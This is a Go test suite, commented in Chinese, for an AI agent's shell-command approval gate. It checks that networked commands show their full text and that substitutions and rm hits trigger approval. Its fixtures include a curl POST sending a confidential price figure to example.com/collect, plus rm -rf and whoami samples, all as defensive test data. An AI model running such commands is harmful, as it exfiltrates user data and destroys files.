package tool

import (
	"encoding/json"
	"strings"
	"testing"

	"github.com/workagent/auto-agent/internal/policy"
)

// shell_exec 的联网审批必须把命令原文原样带出去：
// 用户能判断的只有「URL 里是不是有我的数据」，摘要或截断都会让这个判断失效。
func TestApprovalForNetworkCommandCarriesFullCommand(t *testing.T) {
	tool := shellExec()
	cmd := `curl -X POST -d '{"q":"Q3 华东报价底线"}' https://example.com/collect`
	args, _ := json.Marshal(map[string]any{"command": cmd, "need_network": true})

	action := ApprovalFor(tool, args)
	if action == nil {
		t.Fatal("声明联网的命令应触发审批")
	}
	if action.Kind != policy.ActionShell {
		t.Fatalf("动作类型应为 shell，得到 %q", action.Kind)
	}
	if action.Detail != cmd {
		t.Fatalf("Detail 必须是命令原文\nwant: %s\ngot:  %s", cmd, action.Detail)
	}
	if !strings.Contains(action.Reason, "访问网络") {
		t.Errorf("文案要说明会联网，得到 %q", action.Reason)
	}
	if !strings.Contains(action.Reason, "敏感信息") {
		t.Errorf("文案要提示检查会话内容，得到 %q", action.Reason)
	}
}

// 本地命令不该弹审批：装依赖之外的日常操作占绝大多数，
// 误触发会让用户对审批卡麻木。
func TestApprovalForLocalCommandIsNil(t *testing.T) {
	tool := shellExec()
	for _, cmd := range []string{"ls -la", "grep -rn foo .", "cat README.md", "npm run build"} {
		args, _ := json.Marshal(map[string]string{"command": cmd})
		if action := ApprovalFor(tool, args); action != nil {
			t.Errorf("%q 不该触发审批，得到 %+v", cmd, action)
		}
	}
}

// heredoc 正文是数据：带引号的定界符里反引号不会被展开，不能当成命令替换。
//
// 这条用例来自真实会话：模型用 `cat > a.ts <<'TS_EOF'` 整篇写 TS，正文里的模板
// 字符串让每一次写文件都弹一次「反引号命令替换」，用户点了四次同意、续跑了四轮。
func TestMatchApprovalCommandIgnoresHeredocBody(t *testing.T) {
	cmd := "cat > a.ts <<'TS_EOF'\n" +
		"const url = `https://example.com/${id}`;\n" +
		"const now = $(date);\n" +
		"TS_EOF\n" +
		"ls -la"
	if hit := MatchApprovalCommand(cmd, DefaultApprovalCommands); hit != "" {
		t.Fatalf("heredoc 正文里的反引号与 $( ) 是数据，不该命中 %q", hit)
	}

	// 双引号定界符的 heredoc 同样不展开：正文整段都是数据
	quoted := "cat > b.txt <<\"EOF\"\n`whoami`\nEOF"
	if hit := MatchApprovalCommand(quoted, DefaultApprovalCommands); hit != "" {
		t.Fatalf("双引号定界符的 heredoc 正文也不展开，不该命中 %q", hit)
	}

	// 定界符之后的命令仍然是命令
	after := "cat > c.txt <<'EOF'\n`data`\nEOF\nrm -rf build"
	if hit := MatchApprovalCommand(after, DefaultApprovalCommands); hit != "rm" {
		t.Fatalf("heredoc 之后的命令照常判，want rm, got %q", hit)
	}
}

// 真正会被展开的地方不能放过：单引号之外、双引号之内的反引号与 $( ) 都要确认。
func TestMatchApprovalCommandKeepsRealSubstitution(t *testing.T) {
	cases := map[string]string{
		"echo `date`":                   "反引号命令替换",
		"echo \"now: `date`\"":          "反引号命令替换",
		"echo \"now: $(date)\"":         "命令替换",
		"bash -c 'rm -rf /tmp/x'":       "shell -c",
		"grep -rn 'a b' .":              "",
		"sed -i 's/a/b/' f.txt && echo": "",
	}
	for cmd, want := range cases {
		if got := MatchApprovalCommand(cmd, DefaultApprovalCommands); got != want {
			t.Errorf("%q 应命中 %q，实际 %q", cmd, want, got)
		}
	}
}

// 名单与联网准入同时命中时只合成一张卡：一次点击要同时解决两件事。
// 分成两张卡时用户得对同一件事点两次同意，中间还各要续跑一轮。
func TestApprovalForMergesCommandListAndNetwork(t *testing.T) {
	tl := shellExec()
	cmd := "rm -rf ./dist && python3 build.py"
	args, _ := json.Marshal(map[string]any{"command": cmd, "need_network": true})

	action := ApprovalFor(tl, args)
	if action == nil {
		t.Fatal("既命中名单又声明联网，应触发审批")
	}
	if len(action.Covers) != 2 {
		t.Fatalf("应覆盖两条动作键，实际 %+v", action.Covers)
	}
	if !action.CoversKey(policy.ActionShell + ":rm") {
		t.Fatalf("Covers 里应有名单命中：%+v", action.Covers)
	}
	if !action.CoversKey(shellNetApprovalKey(tl.Name, args)) {
		t.Fatalf("Covers 里应有联网准入：%+v", action.Covers)
	}
	if !strings.Contains(action.Reason, "rm") || !strings.Contains(action.Reason, "脚本") {
		t.Fatalf("文案要同时说清两件事，实际 %q", action.Reason)
	}
	if action.Detail != cmd {
		t.Fatalf("Detail 必须是命令原文")
	}
}

// 只命中名单时 Covers 留空，Key 与本轮记忆的粒度不变。
func TestApprovalForSingleHitKeepsKey(t *testing.T) {
	tl := shellExec()
	args, _ := json.Marshal(map[string]any{"command": "rm -rf build"})
	action := ApprovalFor(tl, args)
	if action == nil || action.Key != policy.ActionShell+":rm" || len(action.Covers) != 0 {
		t.Fatalf("单条命中不该展开 Covers，实际 %+v", action)
	}
}
